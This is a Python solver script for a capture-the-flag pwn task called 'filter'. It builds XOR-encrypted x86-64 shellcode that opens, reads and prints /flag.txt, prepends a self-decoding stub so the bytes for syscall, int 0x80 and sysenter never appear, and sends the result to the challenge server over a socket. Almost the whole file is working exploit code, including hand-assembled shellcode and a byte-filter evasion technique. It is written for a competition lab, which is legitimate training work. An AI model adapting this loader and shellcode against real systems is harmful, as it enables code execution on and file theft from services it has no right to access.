#!/usr/bin/env python3
"""
filter (pwn) solver.

Guard blocks only adjacent byte pairs 0f05 (syscall), cd80 (int 0x80), 0f34 (sysenter).
Idea: send XOR-encrypted shellcode with a short plaintext-safe decoder stub.
The stub decodes the body in the RWX mmap region and falls through into it.

Session token is read from env var SESSION_TOKEN (never stored in files).
"""
import json
import os
import re
import socket
import time
import urllib.request

API = "https://api.ctfcup.online"
FORBIDDEN = {(0x0F, 0x05), (0xCD, 0x80), (0x0F, 0x34)}

# open("/flag.txt", O_RDONLY) -> read -> write(1, ...) -> exit(0)
PLAIN = bytes.fromhex(
    "48bb" "7400000000000000"  # mov rbx,"t\0\0\0\0\0\0\0"  (high chunk, with NUL)
    "53"                # push rbx
    "48bb" "2f666c61672e7478"  # mov rbx,"/flag.tx"        (low chunk)
    "53"                # push rbx
    "4889e7"            # mov rdi,rsp  -> "/flag.txt\0"
    "31f6"              # xor esi,esi
    "31d2"              # xor edx,edx
    "b802000000"        # mov eax,2 (open)
    "0f05"              # syscall
    "89c7"              # mov edi,eax
    "4881ec00010000"    # sub rsp,0x100
    "4889e6"            # mov rsi,rsp
    "ba00010000"        # mov edx,0x100
    "31c0"              # xor eax,eax (read)
    "0f05"              # syscall
    "89c2"              # mov edx,eax
    "bf01000000"        # mov edi,1
    "b801000000"        # mov eax,1 (write)
    "0f05"              # syscall
    "31ff"              # xor edi,edi
    "b83c000000"        # mov eax,60 (exit)
    "0f05"              # syscall
)


def has_forbidden(buf: bytes) -> bool:
    return any((a, b) in FORBIDDEN for a, b in zip(buf, buf[1:]))


def build(key: int) -> bytes:
    enc = bytes(b ^ key for b in PLAIN)
    n = len(PLAIN)
    lea = b"\x48\x8d\x35" + (15).to_bytes(4, "little")       # lea rsi,[rip+15]
    movecx = b"\xb9" + n.to_bytes(4, "little")               # mov ecx,n
    loop = bytes([0x80, 0x36, key]) + b"\x48\xff\xc6" + b"\xff\xc9" + b"\x75\xf6"
    stub = lea + movecx + loop                               # xor/inc/dec/jnz
    assert len(stub) == 22
    return stub + enc


def pick_payload() -> bytes:
    for key in range(1, 256):
        blob = build(key)
        if not has_forbidden(blob):
            return blob
    raise RuntimeError("no safe key")


def get_instance(task_id: str, token: str):
    body = json.dumps({"session": {"token": token}}).encode()
    req = urllib.request.Request(
        f"{API}/api/users/profile", data=body,
        headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=20) as r:
        data = json.loads(r.read().decode())
    for inst in data.get("instances", []):
        if inst.get("task_id") == task_id:
            return inst
    return None


def run(host: str, port: int, inst_token: str, blob: bytes) -> bytes:
    s = socket.create_connection((host, port), timeout=15)
    out = b""

    def read_until(marker: bytes) -> bytes:
        nonlocal out
        while marker not in out:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
        return out

    read_until(b"> ")
    s.sendall(inst_token.encode() + b"\n")
    read_until(b"Send your shellcode")
    s.sendall(len(blob).to_bytes(4, "little") + blob)
    time.sleep(1.0)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    s.close()
    return out


def main():
    # Instance data is fetched beforehand (PowerShell) and passed via env vars,
    # because python's certifi bundle rejects the api certificate on this machine.
    endpoint = os.environ.get("INST_ENDPOINT", "")
    inst_token = os.environ.get("INST_TOKEN", "")
    if not endpoint or not inst_token:
        raise SystemExit("set INST_ENDPOINT and INST_TOKEN env vars")
    m = re.match(r"nc\s+(\S+)\s+(\d+)", endpoint)
    host, port = m.group(1), int(m.group(2))
    blob = pick_payload()
    print(f"[*] endpoint {host}:{port}, payload {len(blob)} bytes")
    out = b""
    for attempt in range(1, 6):
        try:
            out = run(host, port, inst_token, blob)
            if out:
                break
        except (ConnectionResetError, socket.timeout, OSError) as exc:
            print(f"[!] attempt {attempt} failed: {exc}")
            time.sleep(1.0)
    text = out.decode(errors="replace")
    print(text)
    flag = re.search(r"ctfcup\{[^}\s]*\}", text)
    if flag:
        print("[+] FLAG:", flag.group(0))


if __name__ == "__main__":
    main()
